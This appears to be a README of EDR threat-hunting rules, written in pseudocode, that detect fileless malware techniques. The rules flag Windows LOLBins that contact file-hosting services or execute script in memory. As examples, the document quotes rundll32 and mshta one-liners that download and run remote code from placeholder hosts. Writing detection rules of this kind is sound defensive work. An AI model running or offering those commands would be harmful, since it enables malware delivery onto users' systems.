# Fileless Malware Techniques detection rules
Threat Hunting rules related to the fileless malware techniques presented in the conference AsturCON 2023 in Oviedo. These rules are aimed to be used in EDRs, but do not use any EDR language in particular (except one of them) so as to avoid technology dependence. They are written in pseudocode and can be easily translated to any EDR language in order to be used.

## [TA0001][T1566.002] Using well-known web services to store malware

Many malware or threat groups (such as Aggah) use common web services to store their malware and then download them from the victim machines. They can use Github, Google drive, BitBucket, Discord... With this query we look for connections to these web services from common Windows LOLBins, which may indicate an attempt to download malware.

```
event_ type = NETWORK and URL has_any ("blogspot.com", "pastebin.com", "bitbucket.org", "archive.org", "zkdusercontent.com", "raw.githubusercontent.com", "cdn.discordapp.com",  "drive.google.com", "www.googleapis.com")
and process_name in ("mshta.exe", "wscript.exe", "cscript.exe", "powershell.exe", "pwsh.exe", "cmd.exe", "certutil.exe", "hh.exe", "rundll32.exe", "regsvr32.exe")
```
## [TA0005][T1218.005] Executing VBScript or Javascript code in memory with rundll32.exe, mshta.exe, cscript or wscript

These four LOLBins can be used to execute VBScript or Javascript code in memory, with commands similar to:

*rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');")*

*mshta.exe javascript:a=GetObject("script:https://webserver/payload.sct").Exec();close();*

```
event_type = PROCESS and process_name in ("rundll32.exe", "mshta.exe", "cscript.exe", "wscript.exe") and process_commandline has_any ("vbscript", "javascript")

```




